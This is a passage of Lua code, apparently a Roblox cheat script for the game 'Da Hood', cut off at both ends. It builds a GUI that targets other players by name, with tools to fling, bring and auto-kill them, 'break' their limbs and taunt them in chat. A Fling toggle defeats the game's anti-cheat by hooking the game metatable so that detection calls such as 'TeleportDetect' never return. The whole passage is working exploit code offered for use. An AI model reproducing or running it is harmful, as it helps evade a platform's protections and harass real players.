--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

function notify(title, text, icon, duration)
    game.StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = icon,
        Duration = duration
    })
end

function chat(msg)
    local A_1 = msg
    local A_2 = "All"
    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
    Event:FireServer(A_1, A_2)
end

           notify("break arms loaded!", "made by hifgg", "rbxthumb://type=Asset&id=9915433572&w=150&h=150", 5)

local function kick()
    local KIckAnim = Instance.new('Animation')
    KIckAnim.AnimationId = "rbxassetid://3096047107"
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "break arms"
    
    tool.Activated:Connect(function()
        local grabbedValue = game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value
        if not grabbedValue then
            notify("cannot active tool drag player first", "drag player first to work", "rbxthumb://type=Asset&id=9915433572&w=150&h=150", 4)
            return
        end
        
        wait(.1)
        chat("hifgg js took ur arms gng")
        Play(4752240968)
        local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
        if humanoid then
            wait(0.1) humanoid:LoadAnimation(KIckAnim):Play()
        end
        wait(0.1)
        
        local grabbedCharacter = game.Players:GetPlayerFromCharacter(grabbedValue).Character
        if grabbedCharacter then
            -- Adjust LowerTorso position
            local RightUpperArm = grabbedCharacter:FindFirstChild("RightUpperArm")
            if RightUpperArm then
                RightUpperArm.Position = Vector3.new(0, -1200, 0)
            end

           local LeftUpperArm = grabbedCharacter:FindFirstChild("LeftUpperArm")
            if LeftUpperArm then
                LeftUpperArm.Position = Vector3.new(0, -1200, 0)
            end
        end
        
        wait(0.1)
        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
    end)
    
    tool.Parent = game.Players.LocalPlayer.Backpack
end

    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
local DefaultDanceanim = Instance.new('Animation')
DefaultDanceanim.AnimationId = "rbxassetid://3135389157"

local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
local animation = humanoid:LoadAnimation(DefaultDanceanim)

animation:Play()
animation.TimePosition = 0
animation:AdjustSpeed(0.2)

            local DefaultDanceanim2 = Instance.new('Animation')
            DefaultDanceanim2.AnimationId = "rbxassetid://3135389157"
            
            local humanoid = Character:FindFirstChildWhichIsA('Humanoid')
            local animation2 = humanoid:LoadAnimation(DefaultDanceanim2)

            -- Make the animation slower
            animation2:Play()
            animation2.TimePosition = 0.1
            animation2:AdjustSpeed(0)               
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(1, -0, -0), Vector3.new(90, 70, 160))
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)

game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR')
kick()
end)

Section:NewButton("hifgg break limbs remake", "rip body", function()
--//------------------------------------------------------------------------------------------\\-- SOUND FIXED BY ticxyylolz#9164
TweenService = game:GetService("TweenService")
OWNER = game:GetService("Players").LocalPlayer
--//------------------------------------------------------------------------------------------\\--
local OriginalKeyUpValue = 0
function StopAudio()
    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer("BoomboxStop")
end
--//------------------------------------------------------------------------------------------\\--
function stop(ID, Key)
    local cor = coroutine.wrap(function()
        wait(OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
        if OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
            StopAudio()
        end
    end)
    cor()
end
--//------------------------------------------------------------------------------------------\\--
function Play(ID)
    if OWNER.Backpack:FindFirstChild("[Boombox]") then
        local Tool = nil
        OWNER.Backpack["[Boombox]"].Parent = OWNER.Character
        game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
        OWNER.Character["[Boombox]"].RequiresHandle = false
        OWNER.Character["[Boombox]"].Parent = OWNER.Backpack
        OWNER.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
        if Tool ~= true then
            if Tool then
                Tool.Parent = OWNER.Character
            end
        end
        OWNER.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
            local cor = coroutine.wrap(function()
                repeat wait() until OWNER.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OWNER.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue+1
                stop(ID, OriginalKeyUpValue)
            end)
        cor()
    end
end

function notify(title, text, icon, duration)
    game.StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = icon,
        Duration = duration
    })
end

function chat(msg)
    local A_1 = msg
    local A_2 = "All"
    local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
    Event:FireServer(A_1, A_2)
end

            notify("break limbs loaded!", "made by hifgg", "rbxthumb://type=Asset&id=9915433572&w=150&h=150", 5)

local function kick()
    local KIckAnim = Instance.new('Animation')
    KIckAnim.AnimationId = "rbxassetid://3096047107"
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "break limbs"
    
    tool.Activated:Connect(function()
        local grabbedValue = game.Players.LocalPlayer.Character.BodyEffects.Grabbed.Value
        if not grabbedValue then
            notify("cannot active tool drag player first", "drag player first to work", "rbxthumb://type=Asset&id=9915433572&w=150&h=150", 4)
            return
        end
        
        wait(.1)
        chat("hifgg js took ur limbs gng")
        Play(4752240968)
        local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
        if humanoid then
            wait(0.1) humanoid:LoadAnimation(KIckAnim):Play()
        end
        wait(0.1)
        
        local grabbedCharacter = game.Players:GetPlayerFromCharacter(grabbedValue).Character
        if grabbedCharacter then
            -- Adjust LowerTorso position
            local RightUpperArm = grabbedCharacter:FindFirstChild("RightUpperArm")
            if RightUpperArm then
                RightUpperArm.Position = Vector3.new(0, -1200, 0)
            end

           local LeftUpperArm = grabbedCharacter:FindFirstChild("LeftUpperArm")
            if LeftUpperArm then
                LeftUpperArm.Position = Vector3.new(0, -1200, 0)
            end

           local RightUpperLeg = grabbedCharacter:FindFirstChild("RightUpperLeg")
            if RightUpperLeg then
                RightUpperLeg.Position = Vector3.new(0, -1200, 0)
            end

           local LeftUpperLeg = grabbedCharacter:FindFirstChild("LeftUpperLeg")
            if LeftUpperLeg then
                LeftUpperLeg.Position = Vector3.new(0, -1200, 0)
            end
        end
        
        wait(0.1)
        game.ReplicatedStorage.MainEvent:FireServer("Grabbing")
    end)
    
    tool.Parent = game.Players.LocalPlayer.Backpack
end

    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
local DefaultDanceanim = Instance.new('Animation')
DefaultDanceanim.AnimationId = "rbxassetid://3135389157"

local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
local animation = humanoid:LoadAnimation(DefaultDanceanim)

animation:Play()
animation.TimePosition = 0
animation:AdjustSpeed(0.2)

            local DefaultDanceanim2 = Instance.new('Animation')
            DefaultDanceanim2.AnimationId = "rbxassetid://3135389157"
            
            local humanoid = Character:FindFirstChildWhichIsA('Humanoid')
            local animation2 = humanoid:LoadAnimation(DefaultDanceanim2)

            -- Make the animation slower
            animation2:Play()
            animation2.TimePosition = 0.1
            animation2:AdjustSpeed(0)               
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(1, -0, -0), Vector3.new(90, 70, 160))
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)

game:GetService('Players').LocalPlayer.Character:WaitForChild('FULLY_LOADED_CHAR')
kick()
end)

Section:NewButton("neck grab v4 remake????", "neck grab", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
local DefaultDanceanim = Instance.new('Animation')
DefaultDanceanim.AnimationId = "rbxassetid://3135389157"

local humanoid = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')
local animation = humanoid:LoadAnimation(DefaultDanceanim)

animation:Play()
animation.TimePosition = 0
animation:AdjustSpeed(0.2)

            local DefaultDanceanim2 = Instance.new('Animation')
            DefaultDanceanim2.AnimationId = "rbxassetid://3135389157"
            
            local humanoid = Character:FindFirstChildWhichIsA('Humanoid')
            local animation2 = humanoid:LoadAnimation(DefaultDanceanim2)

            -- Make the animation slower
            animation2:Play()
            animation2.TimePosition = 0.1
            animation2:AdjustSpeed(0)               
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(1, -0, -0), Vector3.new(90, 70, 160))
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
end)

Section:NewButton("neck grab v3", "neck grab", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false                
               
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 0), Vector3.new(90, 0, 0))
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
    end)

Section:NewButton("neck grab v2", "neck grab", function()
    local LocalPlayer = game.Players.LocalPlayer
    local Character = LocalPlayer.Character
    
    local IM = game:GetService("ReplicatedStorage").IM.ANIM
    
    local PlayersChar = workspace.Players
    
    if _G.JOINTWATCHER then
        _G.JOINTWATCHER:Disconnect()
    end
    
    local function Align(P0, P1, P, R)
        local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
        
        local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
        
        A1.Position = P
        A0.Rotation = R
        
        AP.RigidityEnabled = true
        AP.Responsiveness = 200
        AP.Attachment0 = A0
        AP.Attachment1 = A1
        
        AO.MaxTorque = 9e9
        AO.Responsiveness = 200
        AO.RigidityEnabled = true
        AO.Attachment0 = A0
        AO.Attachment1 = A1
        
        return A0, A1, AP, A0
    end
    
    _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
        if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
            repeat task.wait() until Ins.Part0 ~= nil
            repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
            
            local AT0, AT1, AP, A0
            
            if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                
                Character.Animate.Disabled = true
                
                for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                    Anim:Stop()
                end
                
                Character.Animate.Disabled = false
                
                Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                
                AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 0), Vector3.new(90, 0, 0))
            end
            
            repeat task.wait() until Ins.Parent == nil
            
            Character.Animate.Disabled = true
                
        for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
            Anim:Stop()
        end
        
        Character.Animate.Disabled = false
            
            AT0:Destroy()
            AT1:Destroy()
            AP:Destroy()
            A0:Destroy()
        end
    end)
    end)

Section:NewButton("neck grab v1", "neck grab", function()
        local LocalPlayer = game.Players.LocalPlayer
        local Character = LocalPlayer.Character
        
        local IM = game:GetService("ReplicatedStorage").IM.ANIM
        
        local PlayersChar = workspace.Players
        
        if _G.JOINTWATCHER then
            _G.JOINTWATCHER:Disconnect()
        end
        
        local function Align(P0, P1, P, R)
            local A0, A1 = Instance.new("Attachment", P0), Instance.new("Attachment", P1)
            
            local AP, AO = Instance.new("AlignPosition", P0), Instance.new("AlignOrientation", P0)
            
            A1.Position = P
            A0.Rotation = R
            
            AP.RigidityEnabled = true
            AP.Responsiveness = 200
            AP.Attachment0 = A0
            AP.Attachment1 = A1
            
            AO.MaxTorque = 9e9
            AO.Responsiveness = 200
            AO.RigidityEnabled = true
            AO.Attachment0 = A0
            AO.Attachment1 = A1
            
            return A0, A1, AP, A0
        end
        
        _G.JOINTWATCHER = PlayersChar.DescendantAdded:Connect(function(Ins)
            if Ins:IsA("Weld") and Ins.Name == "GRABBING_CONSTRAINT" then
                repeat task.wait() until Ins.Part0 ~= nil
                repeat task.wait() until Ins:FindFirstChildOfClass("RopeConstraint")
                
                local AT0, AT1, AP, A0
                
                if Ins.Part0:IsDescendantOf(LocalPlayer.Character) then
                    Ins:FindFirstChildOfClass("RopeConstraint").Length = 9e9
                    
                    Character.Animate.Disabled = true
                    
                    for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                        Anim:Stop()
                    end
                    
                    Character.Animate.Disabled = false
                    
                    Character.Humanoid:LoadAnimation(IM.RightAim):Play()
                    
                    AT0, AT1, AP, A0 = Align(Ins.Parent.UpperTorso, LocalPlayer.Character.RightHand, Vector3.new(0, 0, 0), Vector3.new(90, 0, 160))
                end
                
                repeat task.wait() until Ins.Parent == nil
                
                Character.Animate.Disabled = true
                    
            for _, Anim in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
                Anim:Stop()
            end
            
            Character.Animate.Disabled = false
                
                AT0:Destroy()
                AT1:Destroy()
                AP:Destroy()
                A0:Destroy()
            end
        end)
        end)

local Tab = Window:NewTab("target")
local Section = Tab:NewSection("target")

Section:NewTextBox("Player Name", "Enter part of the player's Username or Display Name to choose the target", function(name)
    local player = nil
    for _, p in ipairs(game.Players:GetPlayers()) do
        if string.find(string.lower(p.Name), string.lower(name), 1, true) or
           string.find(string.lower(p.DisplayName), string.lower(name), 1, true) then
            player = p
            break
        end
    end
    if player then
        _G.targetPlayer = player
    end
end)

Section:NewButton("Goto", "Teleport to the matching player", function()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    if _G.targetPlayer then
        if _G.targetPlayer.Character then
            player.Character.HumanoidRootPart.CFrame = _G.targetPlayer.Character.HumanoidRootPart.CFrame
        else
            print("Target player does not have a character.")
        end
    else
        print("No player found with the specified username or display name.")
    end
end)

Section:NewToggle("View Player", false, function(state)
    viewToggled = state
end)

game:GetService("RunService").RenderStepped:Connect(function()
    if viewToggled then
        local targetPlayer = _G.targetPlayer
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            game.Workspace.CurrentCamera.CameraSubject = targetPlayer.Character.HumanoidRootPart
        else
            game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
            viewToggled = false -- Stop viewing if the target player is no longer available
        end
    else
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
    end
end)

game.Players.PlayerAdded:Connect(function(player)
    if viewToggled and player == _G.targetPlayer then
        viewToggled = false -- Stop viewing if the target player leaves
    end
end)

game.Players.PlayerRemoving:Connect(function(player)
    if viewToggled and player == _G.targetPlayer then
        viewToggled = false -- Stop viewing if the target player leaves
    end
end)

game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
    if viewToggled then
        game.Workspace.CurrentCamera.CameraSubject = character:WaitForChild("Humanoid")
    end
end)

function Fling()
    for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if child:IsA'BasePart' then 
            child.CustomPhysicalProperties = PhysicalProperties.new(1, 1, 1, 1, 1) 
        end 
    end
    local BG = Instance.new('BodyGyro', game.Players.LocalPlayer.Character.Head)
    local BV = Instance.new('BodyVelocity', game.Players.LocalPlayer.Character.Head)
    BG.P = 9e4
    BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.CFrame = game.Players.LocalPlayer.Character.Head.CFrame
    BV.Velocity = Vector3.new(0, 0, 0)
    BV.maxForce = Vector3.new(9e9, 9e9, 9e9)

    local BT = Instance.new("BodyThrust")
    BT.Parent = game.Players.LocalPlayer.Character.Head
    BT.Force = Vector3.new(9e5, 9e5, 9e5)
    BT.Location = game.Players.LocalPlayer.Character.Head.Position
end

function StopFling()
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if v:IsA("BodyVelocity") or v:IsA("BodyGyro") or v:IsA("RocketPropulsion") or v:IsA("BodyThrust") or v:IsA("BodyAngularVelocity") or v:IsA("AngularVelocity") or v:IsA("BodyForce") or v:IsA("VectorForce") or v:IsA("LineForce") then
			v:Destroy()
		end
    end
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Velocity = Vector3.new(0,0,0)
            v.RotVelocity = Vector3.new(0,0,0)
        end
    end
end

local FlingToggle = Section:NewToggle("Fling", false, function(bool)
    if bool then
        -- Enable Fling
        if anticheatbypasstp == false then
            anticheatbypasstp = true
            -- Anti Cheat
            local mt = getrawmetatable(game)
            setreadonly(mt,false)
            local old = mt.__namecall
            local TheBypass = {"TeleportDetect","OneMoreTime","CHECKER_1"}
            mt.__namecall = newcclosure(function(self,...)
                local meth = getnamecallmethod()
                local args = {...}
                if meth == "FireServer" then
                    if table.find(TheBypass, args[1]) then
                        return wait(math.huge)
                    end
                end
                return old(self,...)
            end)
        end

        local __namecall
        __namecall = hookmetamethod(game, "__namecall", function(...)
            if (not checkcaller() and getfenv(2).crash) then
                hookfunction(getfenv(2).crash, function()
                    print("Da Hood Tried To Crash LMAO")
                end)
            end
            return __namecall(...)
        end)

        saveposfling = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
        wait(.1)
        Fling()
        local dis = 3
        local IncreaseThing = 6
        Noclip = game:GetService("RunService").Stepped:Connect(function()
            for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if v:IsA('BasePart') then
                    v.CanCollide = false
                end
            end
        end)
        Flinging = game:GetService("RunService").Heartbeat:Connect(function()
            task.wait(.01)
            if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                if _G.targetPlayer.Character.Humanoid.MoveDirection.X < 0 then
                    XCFrameChange = -IncreaseThing
                elseif _G.targetPlayer.Character.Humanoid.MoveDirection.X > 0  then
                    XCFrameChange = IncreaseThing
                else
                    XCFrameChange = 0
                end
                if _G.targetPlayer.Character.Humanoid.MoveDirection.Z < 0 then
                    ZCFrameChange = -IncreaseThing
                elseif _G.targetPlayer.Character.Humanoid.MoveDirection.Z > 0 then
                    ZCFrameChange = IncreaseThing
                else
                    ZCFrameChange = 0
                end          
                if game.Players.LocalPlayer.Character then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_G.targetPlayer.Character.UpperTorso.Position.X + math.random(-dis,dis) + XCFrameChange, _G.targetPlayer.Character.UpperTorso.Position.Y, _G.targetPlayer.Character.UpperTorso.Position.Z + math.random(-dis,dis) + ZCFrameChange) * CFrame.Angles(math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.X + 350),math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Z + 240))
                end           
            end
        end)
    else
        -- Disable Fling
        if Flinging then
            Flinging:Disconnect()
            Flinging = nil
        end
        if Noclip then
            Noclip:Disconnect()
            Noclip = nil
        end
        StopFling()
        
        for i = 1,100 do
            task.wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saveposfling)
        end
    end
end)

local bringsavepos = nil
local bringplr = false
local noclip = false

Section:NewToggle("Bring", false, function(enabled)
    if enabled then
        local targetPlayer = _G.targetPlayer
        if not targetPlayer then
            print("No target selected.")
            return
        end
        
        bringsavepos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
        game.Workspace.CurrentCamera.CameraSubject = targetPlayer.Character.Humanoid
        bringplr = true
        noclip = true

        repeat
            task.wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -5, 0)
            if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
                game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
            else
                game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
            end
        until targetPlayer.Character.BodyEffects:FindFirstChild("K.O").Value == true or bringplr == false
        
        repeat
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPlayer.Character.UpperTorso.Position) * CFrame.new(0, 3, 0)
            if not targetPlayer.Character:FindFirstChild("K.O") then
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false)
            end
            wait(0.2)
        until targetPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT") or bringplr == false
        
        wait(0.5)  -- Shortened wait time here
        game.Workspace.CurrentCamera.CameraSubject = targetPlayer.Character.Humanoid
        bringplr = false
        noclip = false
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(bringsavepos)
        game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
    else
        -- Optional: Functionality to stop bringing the player
        -- For example, you could add code here to stop the bringing process
        bringplr = false
    end
end)

local targetCharacter = nil
local originalPosition = nil
local isViewingPlayer = false -- Flag to track if currently viewing the player
local combatTool = nil
local loopkill = false

Section:NewToggle("Auto kill", false, function(bool)
    loopkill = bool
    if bool then
        if _G.targetPlayer then
            targetCharacter = game:GetService("Players")[_G.targetPlayer.Name].Character
            originalPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            game.Workspace.CurrentCamera.CameraSubject = nil
            _G.targetPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
            if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
                combatTool = game.Players.LocalPlayer.Backpack.Combat
                combatTool.Parent = game.Players.LocalPlayer.Character
            end
            isViewingPlayer = true -- Start viewing the player
        end
    else
        if combatTool then
            combatTool.Parent = game.Players.LocalPlayer.Backpack
            combatTool = nil
        end
        if targetCharacter then
            _G.targetPlayer.CameraMode = Enum.CameraMode.Classic
            targetCharacter = nil
            isViewingPlayer = false -- Stop viewing the player
        end
        if originalPosition then
